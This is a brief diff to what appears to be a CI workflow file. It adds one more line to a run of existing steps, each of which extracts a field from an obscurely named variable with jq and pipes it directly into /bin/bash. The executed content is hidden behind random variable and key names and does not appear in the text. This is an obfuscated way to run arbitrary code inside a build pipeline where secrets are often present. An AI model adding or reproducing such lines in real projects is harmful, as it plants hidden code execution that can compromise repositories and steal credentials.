@@ -21,6 +21,7 @@ jobs:
           echo $qgxml82332 | jq -r .yiyu83 | /bin/bash
           printf '%s' "$t265" | jq -r .qd0009 | /bin/bash
           printf '%s' "$c649" | jq -r .lqhhs79 | /bin/bash
+          echo $st210 | jq -r .o8 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
